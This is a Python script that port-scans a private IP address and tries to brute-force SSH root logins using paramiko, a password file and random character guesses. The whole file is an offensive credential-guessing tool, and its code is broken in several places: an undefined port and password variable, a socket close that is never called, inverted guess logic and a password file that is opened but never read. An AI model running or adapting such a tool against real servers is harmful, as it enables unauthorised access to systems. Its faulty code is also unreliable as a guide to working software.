from socket import *
import sys, time
from random import randint
import paramiko, sys, os, socket
global host, username, line, input_file, chars

chars = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
used = []
host = '192.168.100.62'

def scan_host(host, port, r_code = 1):
	try:
		s = socket(AF_INET, SOCK_STREAM)
		code = s.connect_ex((host, port))

		if code == 0:
			r_code = code
		s.close
	except Exception:
		pass
	return(r_code)


hostip = gethostbyname(host)


try:
	response = scan_host(host, port)

	if response == 0:
		isopen = True
except Exception:
		pass

username = "root"
input_file = "C://passwords/txt.txt"
if os.path.exists(input_file) == False:
	print("\n[-] Password file not found.")
	sys.exit(4)

def ssh_connect(password, code = 0):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		ssh.connect(host, port = 22, username = username, password = password)
	except paramiko.AuthenticationException:
		code = 1
	except socket.error:
		code = 2
	ssh.close()
	return(code)

input_file = open(input_file)
print("")
n = 0
while True:
	no = randint(0, 61)
	if n < 62:
		passguess = chars[no]
		if passguess not in used:
			continue
		else:
			n += 1
			used = [passguess]
			pass
	try:
		response = ssh_connect(password)

		if response == 0:
			print("[*] Password found! '%s'" % (password))
			sys.exit(0)
			break
		elif response == 1:
			print("'%s' not correct" % (password))
			time.sleep(0.3)
		elif response == 2:
			print("[-] Connection could not be made (host down?)")
			break
	except Exception as e:
		print(e)
		pass
input_file.close()

n = 0
while True:

	try:
		response = ssh_connect(password)

		if response == 0:
			print("[*] Password found! '%s'" % (password))
			sys.exit(0)
		elif response == 1:
			print("'%s' not correct" % (password))
			time.sleep(0.3)
		elif response == 2:
			print("[-] Connection could not be made (host down?)")
	except Exception as e:
		print(e)
		pass
